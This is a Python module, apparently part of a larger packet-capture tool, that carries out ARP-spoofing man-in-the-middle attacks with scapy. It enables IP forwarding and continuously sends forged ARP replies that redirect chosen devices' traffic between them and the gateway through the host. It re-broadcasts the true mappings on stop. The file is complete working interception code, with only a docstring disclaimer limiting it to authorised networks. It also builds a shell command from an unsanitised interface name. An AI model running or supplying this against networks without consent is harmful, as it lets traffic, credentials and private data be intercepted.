"""
ARP-spoof MITM helper — for a network you OWN / are authorized to test.

Puts this host between selected devices and the gateway so their traffic is
forwarded through us (and therefore visible to the capture engine).

Safeguards:
  * enables kernel IP forwarding on start (so targets keep working)
  * restores it to its previous value on stop
  * re-ARPs the truth (heals the network) on stop / crash
"""
import os
import threading
import time

from scapy.all import ARP, Ether, srp, sendp, conf, get_if_hwaddr


def _run(cmd):
    return os.popen(cmd).read().strip()


def default_gateway(iface):
    """Return the gateway IP for the given interface, or '' if unknown."""
    out = _run(f"ip route show default dev {iface}")
    # e.g. "default via 192.168.100.1 proto dhcp ..."
    parts = out.split()
    if "via" in parts:
        return parts[parts.index("via") + 1]
    # fallback: any default route
    out = _run("ip route show default")
    parts = out.split()
    if "via" in parts:
        return parts[parts.index("via") + 1]
    return ""


def mac_of(ip, iface, timeout=2):
    """Resolve an IP's MAC via ARP request."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=timeout, iface=iface, verbose=0)
        for _, r in ans:
            return r.hwsrc.lower()
    except Exception:
        pass
    return ""


class IPForward:
    """Context helper to toggle net.ipv4.ip_forward and restore it."""
    PATH = "/proc/sys/net/ipv4/ip_forward"

    def __init__(self):
        self.prev = "0"

    def enable(self):
        try:
            self.prev = open(self.PATH).read().strip()
            open(self.PATH, "w").write("1")
            return True
        except Exception:
            return False

    def restore(self):
        try:
            open(self.PATH, "w").write(self.prev or "0")
        except Exception:
            pass


class ArpSpoofer:
    """
    Spoof selected targets <-> gateway in both directions.

    targets: list of dicts {"ip":..., "mac":...}
    """
    def __init__(self, iface, gateway_ip, gateway_mac, interval=2.0):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval
        self.our_mac = get_if_hwaddr(iface).lower()
        self.targets = []          # list of (ip, mac)
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self.thread = None
        self.fwd = IPForward()
        self.running = False

    def set_targets(self, targets):
        with self.lock:
            self.targets = [(t["ip"], t["mac"]) for t in targets
                            if t.get("mac") and t.get("ip") and t["ip"] != self.gateway_ip]

    def start(self):
        if self.running:
            return
        self.fwd.enable()
        self._stop.clear()
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        while not self._stop.is_set():
            with self.lock:
                tgts = list(self.targets)
            pkts = []
            for ip, mac in tgts:
                # tell target: "gateway is at our MAC"
                pkts.append(Ether(dst=mac) /
                            ARP(op=2, psrc=self.gateway_ip, pdst=ip,
                                hwdst=mac, hwsrc=self.our_mac))
                # tell gateway: "target is at our MAC"
                pkts.append(Ether(dst=self.gateway_mac) /
                            ARP(op=2, psrc=ip, pdst=self.gateway_ip,
                                hwdst=self.gateway_mac, hwsrc=self.our_mac))
            if pkts:
                try:
                    sendp(pkts, iface=self.iface, verbose=0)
                except Exception:
                    pass
            self._stop.wait(self.interval)

    def stop(self):
        if not self.running:
            return
        self._stop.set()
        if self.thread:
            self.thread.join(timeout=3)
        self._restore_arp()
        self.fwd.restore()
        self.running = False

    def _restore_arp(self):
        """Broadcast the correct ARP mappings several times to heal the LAN."""
        with self.lock:
            tgts = list(self.targets)
        pkts = []
        for ip, mac in tgts:
            pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff") /
                        ARP(op=2, psrc=self.gateway_ip, pdst=ip,
                            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac))
            pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff") /
                        ARP(op=2, psrc=ip, pdst=self.gateway_ip,
                            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac))
        for _ in range(4):
            try:
                sendp(pkts, iface=self.iface, verbose=0)
            except Exception:
                pass
            time.sleep(0.3)
